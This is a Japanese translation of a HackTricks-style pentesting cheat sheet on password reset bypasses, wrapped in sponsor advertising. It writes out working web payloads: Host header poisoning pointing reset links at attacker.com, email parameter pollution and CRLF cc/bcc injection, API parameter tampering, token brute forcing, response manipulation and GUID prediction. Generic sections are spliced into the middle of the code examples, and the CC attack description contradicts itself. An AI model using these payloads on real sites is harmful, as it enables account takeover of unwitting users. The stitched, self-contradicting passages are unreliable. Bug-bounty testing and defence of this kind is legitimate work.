# パスワードのリセット/忘れた場合のバイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから収益を得ましょう！

{% embed url="https://hackenproof.com/register" %}

以下のテクニックの再編集は、[https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)から取得されました。

## パスワードリセットトークンのリファラ経由の漏洩

**HTTPリファラ**は、要求されているリソースにリンクされているウェブページのアドレスを識別するオプションのHTTPヘッダーフィールドです。リファラ要求ヘッダーには、現在要求されているページへのリンクが行われた前のウェブページのアドレスが含まれています。

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### 悪用方法

* メールアドレスにパスワードリセットを要求する
* パスワードリセットリンクをクリックする
* パスワードを変更しない
* 任意のサードパーティのウェブサイト（例：Facebook、Twitter）をクリックする
* Burpsuiteプロキシでリクエストをインターセプトする
* リファラヘッダーがパスワードリセットトークンを漏洩していないか確認する

### 影響

特定のサイトを制御している人は、ユーザーのパスワード（CSRF攻撃）を変更することができます。なぜなら、この人物はユーザーのリセットパスワードトークンを知っているからです。

### 参考：

* [https://hackerone.com/reports/342693](https://hackerone.com/reports/342693)
* [https://hackerone.com/reports/272379](https://hackerone.com/reports/272379)
* [https://hackerone.com/reports/737042](https://hackerone.com/reports/737042)
* [https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)
* [https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1](https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1)

## パスワードリセットの改ざん

ホストヘッダ攻撃を見つけ、スコープ外である場合は、パスワードリセットボタンを探してみてください！

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### 悪用方法

* Burpsuiteでパスワードリセットリクエストをインターセプトする
* 次のヘッダーを追加するか、Burpsuiteでヘッダーを編集する（1つずつ試してみる）
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* メール内のパスワード変更リンクが attacker.com を指していないか確認します。

### パッチ

`$_SERVER['HTTP_HOST']` の代わりに `$_SERVER['SERVER_NAME']` を使用します。
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### 影響

被害者は、メールで悪意のあるリンクを受け取り、クリックすると、ユーザーのパスワードリセットリンク/トークンが攻撃者に漏洩し、アカウントが完全に乗っ取られます。

### 参考：

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## メールパラメータを操作してパスワードリセット

### 攻撃手法

* 攻撃者のメールを2番目のパラメータとして追加する（`&`を使用）
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* 2番目のパラメータとして攻撃者のメールアドレスを%20を使用して追加します。
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* 2番目のパラメータとして攻撃者のメールアドレスを追加します。使用方法: |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
# パスワードリセットのテスト

## 概要

このテストは、パスワードリセット機能のセキュリティを評価するために行われます。攻撃者がリセットリンクを受け取ることなく、他のユーザーのパスワードをリセットできるかどうかを確認します。

## 攻撃手法

攻撃者は、パスワードリセットフォームに別のユーザーのメールアドレスを入力し、攻撃者自身のメールアドレスをCCとして追加します。これにより、攻撃者はリセットリンクを受け取ることなく、他のユーザーのパスワードをリセットすることができます。

## 手順

1. 攻撃者はパスワードリセットフォームにターゲットユーザーのメールアドレスを入力します。
2. 攻撃者は自身のメールアドレスをCCとして追加します。
3. パスワードリセットリンクがターゲットユーザーに送信されますが、同時に攻撃者にも送信されます。
4. 攻撃者はリセットリンクを使用してターゲットユーザーのパスワードをリセットします。

## 対策方法

この攻撃を防ぐためには、パスワードリセットフォームに攻撃者のメールアドレスをCCとして追加することを禁止する必要があります。攻撃者のメールアドレスを入力することで、攻撃者がリセットリンクを受け取ることなく他のユーザーのパスワードをリセットすることができるため、この脆弱性を修正することが重要です。

## 参考

- [OWASP: Forgot Password](https://owasp.org/www-community/Forgot_Password)
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* 2番目のパラメータとして攻撃者のメールアドレスをBCCとして追加します。
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* 2番目のパラメータとして攻撃者のメールアドレスを追加します。`,`を使用してください。
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* JSON配列の2番目のパラメータとして攻撃者のメールアドレスを追加します。
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### 参考

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## APIパラメータを使用してユーザーのメールアドレスとパスワードを変更する

### 攻撃手法

* 攻撃者は自分のアカウントでログインし、パスワード変更機能に移動します
* Burp Suiteを起動し、リクエストをインターセプトします
* リクエストをインターセプトした後、リピーターに送信し、メールアドレスとパスワードのパラメータを変更します
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### 参考

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### レート制限なし：メールボム<a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### 悪用

* Burp Suiteを起動し、パスワードリセットのリクエストをインターセプトします
* イントルーダーに送信します
* ヌルペイロードを使用します

### 参考

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## パスワードリセットトークンの生成方法を調べる

パスワードリセットトークンのパターンを特定します

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

もし

* タイムスタンプに基づいて生成される場合
* ユーザーIDに基づいて生成される場合
* ユーザーのメールに基づいて生成される場合
* ユーザーの名前と姓に基づいて生成される場合
* 誕生日に基づいて生成される場合
* 暗号化に基づいて生成される場合

Burp Sequencerを使用してトークンのランダム性や予測可能性を見つけます。

## 推測可能なGUID

異なるタイプのGUIDがあります：

* **バージョン0：** nil GUID（"00000000-0000-0000-0000-000000000000"）でのみ見られます。
* **バージョン1：** GUIDは次のように予測可能な方法で生成されます：
* 現在の時刻
* GUIDを生成するシステムの稼働時間中にGUID間で一定の「クロックシーケンス」がランダムに生成されます
* 利用可能な場合、システムのMACアドレスに基づいて生成される「ノードID」
* **バージョン3：** GUIDは、指定された名前と名前空間のMD5ハッシュを使用して生成されます。
* **バージョン4：** GUIDはランダムに生成されます。
* **バージョン5：** GUIDは、指定された名前と名前空間のSHA1ハッシュを使用して生成されます。

GUIDを見てそのバージョンを特定することが可能であり、そのための小さなツールがあります：[**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
もしリセットパスワードのGUIDを生成するために使用されるバージョンが1の場合、GUIDをブルートフォース攻撃で解読することが可能です。
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### 参考文献

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## レスポンスの操作：悪いレスポンスを良いものに置き換える

以下のようなリクエストとレスポンスを探してください。
```php
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
```
# パスワードリセット

パスワードリセット機能は、ユーザーがパスワードを忘れた場合に便利ですが、悪意のあるユーザーにとっては攻撃の標的になる可能性があります。このセクションでは、パスワードリセット機能の脆弱性と、それを悪用する攻撃手法について説明します。

## パスワードリセットの脆弱性

パスワードリセット機能には、以下のような脆弱性が存在する場合があります。

### 1. 弱いトークン生成

パスワードリセットリンクには、一意のトークンが含まれています。しかし、トークンが予測可能な場合、攻撃者はリンクを生成し、他のユーザーのアカウントにアクセスすることができます。

### 2. リンクの期限切れチェックの不備

パスワードリセットリンクには、有効期限が設定されています。しかし、適切な期限切れチェックが行われていない場合、攻撃者は期限切れのリンクを使用してアカウントにアクセスすることができます。

### 3. ユーザー識別情報の不正利用

パスワードリセット機能では、ユーザーの識別情報（メールアドレスなど）を使用してリセットリンクを送信します。しかし、攻撃者が他のユーザーの識別情報を入手した場合、リセットリンクを送信し、アカウントにアクセスすることができます。

## パスワードリセット攻撃手法

パスワードリセット機能を悪用する攻撃手法には、以下のようなものがあります。

### 1. トークン予測攻撃

攻撃者は、トークン生成アルゴリズムの脆弱性を利用して、有効なトークンを予測します。これにより、攻撃者は他のユーザーのアカウントにアクセスすることができます。

### 2. トークンの盗聴

攻撃者は、パスワードリセットリンクを送信する際に使用されるトークンを盗聴することで、他のユーザーのアカウントにアクセスします。

### 3. ユーザー識別情報の漏洩

攻撃者は、他のユーザーの識別情報を入手することで、リセットリンクを送信し、アカウントにアクセスします。

## パスワードリセットのセキュリティ強化

パスワードリセット機能のセキュリティを強化するためには、以下の対策を実施することが重要です。

### 1. 強力なトークン生成

予測不可能なトークンを生成するために、ランダムな文字列や乱数を使用します。

### 2. 期限切れチェックの実施

パスワードリセットリンクの有効期限を設定し、期限切れのリンクは無効化します。

### 3. 2要素認証の導入

ユーザーがパスワードリセットを要求する際に、2要素認証を要求することで、セキュリティを強化します。

### 4. ユーザー識別情報の保護

ユーザーの識別情報を適切に保護し、不正なアクセスを防止します。

パスワードリセット機能の脆弱性を理解し、適切な対策を実施することで、攻撃者からのアカウントへの不正アクセスを防ぐことができます。
```php
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```
### 参考

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### 期限切れのトークンの使用 <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* 期限切れのトークンが再利用できるかどうかを確認します。

### パスワードリセットトークンのブルートフォース攻撃 <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Burpsuiteを使用してリセットトークンをブルートフォース攻撃してみてください。
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* IPベースのレート制限をバイパスするために、Burp SuiteでIP-Rotatorを使用します。

### 参考

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### トークンを使用して試す <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* パスワードリセットトークンを被害者のアカウントに追加して試してみてください。
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### 参考

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## ログアウト/パスワードリセットにおけるセッションの無効化

ユーザーがログアウトまたはパスワードをリセットする場合、現在のセッションは無効にする必要があります。\
したがって、ユーザーがログインしている間に**クッキーを取得**し、**ログアウト**し、**クッキー**がまだ**有効**かどうかを**確認**します。\
ログアウトの代わりに**パスワードを変更**することで、プロセスを繰り返します。

## リセットトークンの有効期限

**リセットトークンには有効期限が必要**であり、期限が切れた後はユーザーのパスワードを変更するためにトークンは有効ではありません。

## 追加のチェック

* username@burp\_collab.net を使用してコールバックを分析する
* User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* 長いパスワード (>200) はDoSにつながる
* 2番目のメールパラメータと値を追加する

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期におけるweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register) してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するためにPRを提出**して、[**hacktricks repo**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)に参加しましょう。

</details>
